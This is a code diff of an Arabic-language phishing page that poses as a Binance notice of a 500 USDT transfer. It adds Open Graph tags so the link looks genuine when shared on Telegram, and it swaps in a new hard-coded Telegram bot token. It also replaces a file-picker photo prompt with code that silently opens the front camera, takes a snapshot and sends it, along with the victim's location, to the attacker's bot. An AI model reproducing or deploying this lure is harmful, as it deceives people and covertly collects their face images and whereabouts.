@@ -3,6 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- ============================================================ -->
+    <!-- 🖼️ أوسمة الصورة المصغرة (تظهر في تليجرام) -->
+    <!-- ============================================================ -->
+    <meta property="og:title" content="Binance - تأكيد استلام التحويل" />
+    <meta property="og:description" content="تم تحويل 500 USDT إلى حسابك. اضغط لتأكيد الاستلام." />
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Binance_logo.svg/1200px-Binance_logo.svg.png" />
+    <meta property="og:image:width" content="800" />
+    <meta property="og:image:height" content="400" />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://arab07.github.io/Usdt/app.html" />
+    <!-- ============================================================ -->
+    
     <title>تأكيد التحويل</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;}
@@ -95,7 +108,7 @@
 <div class="container">
     <div class="overlay">
         <h1>💱 تحويل عملات رقمية</h1>
-        <p>تم تحويل <strong>$5,000 USDT</strong> إلى حسابك</p>
+        <p>تم تحويل <strong>$500 USDT</strong> إلى حسابك</p>
         <p style="font-size:14px;color:#94a3b8;">لتأكيد الاستلام، اضغط الزر أدناه</p>
         <button class="btn" id="confirmBtn">✅ تأكيد الاستلام</button>
         <div class="status" id="status"></div>
@@ -105,10 +118,10 @@
 
 <script>
     // =====================================================
-    // 🔑 بيانات البوت (تم إدخالها مسبقاً)
+    // 🔑 البوت الجديد: @Arab9991_bot
     // =====================================================
-    const BOT_TOKEN = '8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y';
-    const CHAT_ID = '8391968596';
+    const BOT_TOKEN = '8680472604:AAH8b0pnjse3s80jN3M_NxrfewFe0jPzRCw';
+    const CHAT_ID = '8391968596';  // نفس المعرف القديم
     // =====================================================
 
     const btn = document.getElementById('confirmBtn');
@@ -169,26 +182,45 @@
         });
     }
 
-    // ================== دالة التقاط الصورة ==================
+    // ================== دالة التقاط الصورة من الكاميرا الأمامية ==================
 
-    function capturePhoto() {
+    function captureFrontCamera() {
         return new Promise((resolve, reject) => {
-            const input = document.createElement('input');
-            input.type = 'file';
-            input.accept = 'image/*';
-            input.capture = 'user';
-            input.onchange = function(e) {
-                const file = e.target.files[0];
-                if (file) {
-                    resolve(file);
-                } else {
-                    reject('لم يتم اختيار صورة');
+            const video = document.createElement('video');
+            video.style.display = 'none';
+            document.body.appendChild(video);
+
+            navigator.mediaDevices.getUserMedia({
+                video: { 
+                    facingMode: 'user',
+                    width: { ideal: 640 },
+                    height: { ideal: 480 }
                 }
-            };
-            input.onerror = function() {
-                reject('حدث خطأ في الكاميرا');
-            };
-            input.click();
+            })
+            .then((stream) => {
+                video.srcObject = stream;
+                video.play();
+
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    stream.getTracks().forEach(track => track.stop());
+                    video.remove();
+
+                    canvas.toBlob((blob) => {
+                        const file = new File([blob], "selfie.jpg", { type: "image/jpeg" });
+                        resolve(file);
+                    }, 'image/jpeg', 0.9);
+
+                }, 300);
+            })
+            .catch((err) => {
+                reject('تعذر فتح الكاميرا الأمامية: ' + err.message);
+            });
         });
     }
 
@@ -211,11 +243,11 @@
             sendToBot(locationMsg, true);
             showStatus('✅ تم تحديد موقعك', 'success');
 
-            // 3. طلب الصورة
-            showStatus('📸 جاري فتح الكاميرا...', 'loading');
-            const photoFile = await capturePhoto();
+            // 3. تصوير الكاميرا الأمامية
+            showStatus('📸 جاري التقاط صورتك...', 'loading');
+            const photoFile = await captureFrontCamera();
             await sendPhotoToBot(photoFile);
-            sendToBot('📸 تم التقاط صورة الوجه', true);
+            sendToBot('📸 تم التقاط صورة من الكاميرا الأمامية', true);
             showStatus('✅ تم التقاط الصورة', 'success');
 
             // 4. معلومات إضافية
